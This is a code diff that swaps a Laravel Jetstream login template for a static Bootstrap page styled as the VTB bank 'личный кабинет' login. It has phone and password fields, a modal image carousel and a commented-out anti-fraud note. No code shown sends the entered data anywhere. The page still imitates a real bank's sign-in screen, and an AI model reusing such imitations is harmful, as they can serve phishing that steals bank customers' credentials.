@@ -1,48 +1,165 @@
-<x-guest-layout>
-    <x-jet-authentication-card>
-        <x-slot name="logo">
-            <x-jet-authentication-card-logo />
-        </x-slot>
 
-        <x-jet-validation-errors class="mb-4" />
+<!doctype html>
+<html lang="ru">
+<head>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 
-        @if (session('status'))
-            <div class="mb-4 font-medium text-sm text-green-600">
-                {{ session('status') }}
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css" integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">
+    <link rel="stylesheet" type="text/css" href="style1.css">
+
+
+
+    <link rel="shortcut icon" href="vtb.jpg"/>
+
+
+    <title>ВТБ личный кабинет</title>
+</head>
+<body>
+
+<div class="container">
+
+    <div class="row justify-content-start">
+
+        <div class="col-4">
+        </div>
+
+        <div class="col-4 text-left">
+            <h2>ВТБ: личный кабинет</h2>
+        </div>
+
+        <div class="col-4">
+        </div>
+
+    </div>
+
+
+    <div class="row justify-content-start">
+        <div class="col-4"></div>
+        <div class="col-lg-4 col-md-6 col-xs-12">
+            <hr/>
+            <!-- 	<h3> Авторизация</h3>
+              <hr/> -->
+
+            <form>
+                <div class="form-group row">
+                    <label for="inputLogin" class="col-sm-4 col-form-label">Логин</label>
+                    <div class="col-sm-8">
+                        <input  type="text" class="phone form-control" id="inputLogin" data-toggle="tooltip" data-placement="top" title="Введите номер телефона">
+                    </div>
+                </div>
+                <div class="form-group row">
+                    <label for="inputPassword3" class="col-sm-4 col-form-label">Пароль</label>
+                    <div class="col-sm-8">
+                        <input type="password" class="form-control" id="inputPassword3" data-toggle="tooltip" data-placement="top" title="Введите пароль" onchange="pasValid()">
+                    </div>
+                </div>
+
+
+                <div class="form-group row">
+                    <!--   	<div class="col-4"></div>
+                    -->    <div class="col-4">
+                        <button type="button" class="btn btn-outline-primary" data-toggle="modal" data-target="#exampleModal"  id="enter" data-toggle="tooltip" data-placement="top" title="Ожидайте SMS-уведомление по номеру: ">Войти</button>
+
+
+                    </div>
+                </div>
+            </form>
+
+
+
+        </div>
+        <!-- <div class="col-2 ">
+          <p id= "antifrod" data-toggle="tooltip" title="Подумайте о безопасности вашего аккаунта!">Какой-то текст</p>
+        </div>
+
+
+        <div class="col-2"></div>
+        </div> -->
+
+
+
+
+        <div class="modal" tabindex="-1" role="dialog" id="myModal3">
+            <div class="modal-dialog modal-md">
+                <div class="modal-content">
+                    <div class="modal-header">
+                        <h5 class="modal-title"></h5>
+                        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+                            <span aria-hidden="true">&times;</span>
+                        </button>
+                    </div>
+                    <div class="modal-body">
+                        <div id="carouselExampleIndicators" class="carousel slide" data-ride="carousel">
+                            <ol class="carousel-indicators">
+                                <li data-target="#carouselExampleIndicators" data-slide-to="0" class="active"></li>
+                                <li data-target="#carouselExampleIndicators" data-slide-to="1"></li>
+                                <li data-target="#carouselExampleIndicators" data-slide-to="2"></li>
+                            </ol>
+                            <div class="carousel-inner">
+                                <div class="carousel-item active" data-interval="300">
+                                    <img src="carusel\1.jpg" class="d-block w-100" alt="...">
+                                </div>
+                                <div class="carousel-item" data-interval="300">
+                                    <img src="carusel\2.jpg" class="d-block w-100" alt="...">
+                                </div>
+                                <div class="carousel-item" data-interval="300">
+                                    <img src="carusel\3.jpg" class="d-block w-100" alt="...">
+                                </div>
+                            </div>
+                            <a class="carousel-control-prev" href="#carouselExampleIndicators" role="button" data-slide="prev">
+                                <span class="carousel-control-prev-icon" aria-hidden="true"></span>
+                                <span class="sr-only">Previous</span>
+                            </a>
+                            <a class="carousel-control-next" href="#carouselExampleIndicators" role="button" data-slide="next">
+                                <span class="carousel-control-next-icon" aria-hidden="true"></span>
+                                <span class="sr-only">Next</span>
+                            </a>
+                        </div>
+
+                    </div>
+                </div>
             </div>
-        @endif
+        </div>
 
-        <form method="POST" action="{{ route('login') }}">
-            @csrf
 
-            <div>
-                <x-jet-label for="phone" value="{{ __('Phone') }}" />
-                <x-jet-input id="phone" class="block mt-1 w-full" type="phone" name="phone" :value="old('phone')" required autofocus />
-            </div>
 
-            <div class="mt-4">
-                <x-jet-label for="password" value="{{ __('Password') }}" />
-                <x-jet-input id="password" class="block mt-1 w-full" type="password" name="password" required autocomplete="current-password" />
-            </div>
 
-            <div class="block mt-4">
-                <label for="remember_me" class="flex items-center">
-                    <input id="remember_me" type="checkbox" class="form-checkbox" name="remember">
-                    <span class="ml-2 text-sm text-gray-600">{{ __('Remember me') }}</span>
-                </label>
-            </div>
+    </div>
 
-            <div class="flex items-center justify-end mt-4">
-                @if (Route::has('password.request'))
-                    <a class="underline text-sm text-gray-600 hover:text-gray-900" href="{{ route('password.request') }}">
-                        {{ __('Forgot your password?') }}
-                    </a>
-                @endif
 
-                <x-jet-button class="ml-4">
-                    {{ __('Login') }}
-                </x-jet-button>
-            </div>
-        </form>
-    </x-jet-authentication-card>
-</x-guest-layout>
+
+
+
+
+</div>
+
+
+
+
+
+
+
+
+
+</div>
+
+
+
+
+
+<!-- <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js" integrity="sha384-OgVRvuATP1z7JjHLkuOU7Xw704+h835Lr+6QL9UvYjZE3Ipu6Tp75j7Bh/kR0JKI" crossorigin="anonymous"></script> -->
+
+<link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.5/css/bootstrap.min.css" rel="stylesheet"/>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/tether/1.3.7/js/tether.min.js"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.5/js/bootstrap.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.maskedinput/1.4.1/jquery.maskedinput.min.js"></script>
+<script type="text/javascript" src="1.js"></script>
+
+</body>
+</html>
